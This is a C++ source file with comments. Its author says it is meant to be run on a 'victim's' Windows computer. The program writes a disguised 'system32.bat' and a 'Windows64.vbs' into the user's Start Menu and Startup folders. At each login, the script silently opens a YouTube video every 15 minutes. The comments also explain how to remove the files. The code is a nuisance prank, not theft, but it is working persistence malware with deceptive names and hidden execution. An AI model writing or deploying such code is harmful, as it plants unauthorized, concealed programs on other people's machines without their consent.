//Program created a .bat file that opens a website every 15 minutes, and a .vbs file called Windows64.vbs located in the system 
//start folder that runs the bat file silently with no command window. After program is run to remove the resulting files just 
//press win + R to open the run menu, then type shell:startup there you should see the vbs file, go ahead and delete that then 
//go back one level to programs, and delete system32.bat (clever name I know) then you should be fine. desired use is to run the 
// .exe of the program on the desired victum's computer.
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <algorithm>
namespace fs = std::filesystem;

int main()
{
  #ifdef _WIN32

  //location of the bat file that will open the website, name of user is not yet included
  std::string batfile = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/system32.bat";

  //location of the vbs file that will silently run the bat file with no command window, name of user is not yet included
  std::string vbsfile = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows64.vbs";

  //gets user to add to both paths for example here user would be "Users/justi/"
  std::string user = getenv("USERPROFILE");

  //made a copy of the user variable since c++ does not like single backslashes
  std::string auser = user;

  //adds user to vbs path
  vbsfile = user + vbsfile;

  //replaces the slash in user with \\ to match the rest of the path
  std::replace(user.begin(), user.end(), '\\', '/');

  //adds user to bat path
  batfile = user + batfile;

//creation of the vbs file, probably shouldnt need to change anything here
std::ofstream other_file( vbsfile );
other_file << 
    "Set WshShell = CreateObject (\"Wscript.Shell\")\n"
    "WshShell.Run chr(34) & \""<<auser<<"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu"  
    "\\Programs\\system32.bat\" & chr(34), 0 \n"
    "Set WshShell = Nothing";
  
//creation of the bat file
std::ofstream batch_file( batfile );
batch_file << 
    "@ECHO OFF\n"
    ":start \n"
    "start \"chrome\" https://www.youtube.com/watch?v=dQw4w9WgXcQ \n" //put desired website here
    "timeout 900 \n"                                                  //delay for loop currently 15 minutes
    "goto start";

#endif
}
